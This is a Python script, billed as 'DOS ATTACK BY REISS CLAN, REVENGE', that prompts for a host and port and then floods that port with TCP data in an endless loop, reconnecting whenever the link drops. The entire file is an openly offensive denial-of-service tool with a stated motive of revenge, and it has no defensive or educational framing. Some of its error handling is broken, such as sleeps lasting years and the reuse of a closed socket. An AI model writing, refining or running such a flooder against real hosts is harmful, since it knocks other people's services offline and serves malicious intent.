import socket
import time
import os
os.system("clear")
print("""  ___   ___  ___     _ _____ _____ _   ___ _  __
 |   \ / _ \/ __|   /_\_   _|_   _/_\ / __| |/ /
 | |) | (_) \__ \  / _ \| |   | |/ _ \ (__| ' < 
 |___/ \___/|___/ /_/ \_\_|   |_/_/ \_\___|_|\_\ 
                                                """)
print("DOS ATTACK BY REISS CLAN, REVENGE")
print("[BETA]")
print("\n")
print("\n")
time.sleep(0.5)
hostname=input("HOST NAME: ")
print("\n")
time.sleep(0.5)
try:
	ip=socket.gethostbyname(hostname)
except:
	print("something went wrong, check the host name and try again")
	time.sleep(92718173)
print("IP: ", ip)
print("\n")
time.sleep(0.5)
deftime=int(input("DEFFULT TIME OUT (RECOMMENDED : 5) ; "))
print("\n")
time.sleep(0.5)
try:
	socket.setdefaulttimeout(deftime)
except:
	print("something went wrong")
	time.sleep(188381378137)
port=int(input("PORT: "))
print("\n")
time.sleep(0.5)
sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
	conn =sock.connect((ip, port))
except:
	print("maybe this port unavabile on this host, scan the host with NMAP too see which port avabile on this site")
	time.sleep(9999999)
	
kkkk=0
while True:
	try:
		sock.send(bytes("Revenge"*99, "utf-8"))
		kkkk+=1
		print("ATTACKING", ip, "BY PORT : ",port,"[{}]".format(kkkk))
	except:
		print("connection LOST")
		try:
			print("reconnecting...")
			conn =sock.connect((ip, port))
		except:
			print("failed")
			
		
	
	